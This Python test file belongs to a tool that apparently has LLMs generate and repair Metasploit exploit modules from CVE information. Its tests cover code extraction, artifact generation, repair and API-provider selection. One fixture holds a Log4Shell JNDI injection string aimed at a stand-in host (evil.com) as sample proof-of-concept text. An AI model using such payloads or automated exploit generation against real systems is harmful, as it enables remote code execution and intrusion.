"""Tests for the SmartAgent generate and repair functions."""

from zero_forge.agents.smart_agent import generate_artifact, repair_artifact, _extract_code_block, _resolve_provider
from zero_forge.schemas import (
    Artifact,
    ArtifactType,
    CollectedContext,
    ValidationResult,
    VulnerabilityInput,
)


def test_extract_code_block_ruby():
    text = "Here is the code:\n```ruby\nclass Foo\nend\n```\nDone."
    result = _extract_code_block(text)
    assert "class Foo" in result
    assert "```" not in result


def test_extract_code_block_generic():
    text = "```\nputs 'hello'\n```"
    result = _extract_code_block(text)
    assert "puts 'hello'" in result


def test_extract_code_block_no_fence():
    text = "just raw code"
    result = _extract_code_block(text)
    assert result == "just raw code"


def test_generate_artifact_stub(monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    vuln = VulnerabilityInput(cve_id="CVE-2021-44228")
    ctx = CollectedContext(
        cve_id="CVE-2021-44228",
        cve_description="Log4Shell RCE",
        poc_text="${jndi:ldap://evil.com}",
    )

    artifact = generate_artifact(vuln, ctx)
    assert artifact.artifact_type == ArtifactType.METASPLOIT
    assert "MetasploitModule" in artifact.content
    assert artifact.filename.endswith(".rb")
    assert "CVE-2021-44228" in artifact.metadata.get("cve_id", "")


def test_repair_artifact():
    artifact = Artifact(
        artifact_type=ArtifactType.METASPLOIT,
        content="class Foo\nend",
        filename="test.rb",
    )
    validation = ValidationResult(
        is_valid=False,
        errors=["Missing required method: 'exploit'"],
    )
    ctx = CollectedContext(cve_id="CVE-2021-44228")

    repaired = repair_artifact(artifact, validation, ctx)
    assert repaired.artifact_type == ArtifactType.METASPLOIT
    assert repaired.filename == "test.rb"


def test_resolve_provider_openrouter(monkeypatch):
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("ZERO_FORGE_MODEL", "meta-llama/llama-3-70b-instruct")

    api_key, model, extra = _resolve_provider()
    assert api_key == "sk-or-test"
    assert model == "openrouter/meta-llama/llama-3-70b-instruct"
    assert extra == {}


def test_resolve_provider_openrouter_already_prefixed(monkeypatch):
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.setenv("ZERO_FORGE_MODEL", "openrouter/anthropic/claude-3.5-sonnet")

    api_key, model, _ = _resolve_provider()
    assert api_key == "sk-or-test"
    assert model == "openrouter/anthropic/claude-3.5-sonnet"


def test_resolve_provider_openrouter_base_url(monkeypatch):
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-test")
    monkeypatch.setenv("OPENROUTER_BASE_URL", "https://custom.openrouter.proxy/v1")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    api_key, model, extra = _resolve_provider()
    assert api_key == "sk-or-test"
    assert extra["api_base"] == "https://custom.openrouter.proxy/v1"


def test_resolve_provider_openai_fallback(monkeypatch):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.setenv("OPENAI_API_KEY", "sk-openai")
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("ZERO_FORGE_MODEL", "gpt-4o")

    api_key, model, _ = _resolve_provider()
    assert api_key == "sk-openai"
    assert model == "gpt-4o"


def test_resolve_provider_anthropic(monkeypatch):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-anthropic")
    monkeypatch.setenv("ZERO_FORGE_MODEL", "claude-3.5-sonnet")

    api_key, model, _ = _resolve_provider()
    assert api_key == "sk-anthropic"
    assert model == "anthropic/claude-3.5-sonnet"


def test_resolve_provider_stub(monkeypatch):
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)

    api_key, model, _ = _resolve_provider()
    assert api_key is None
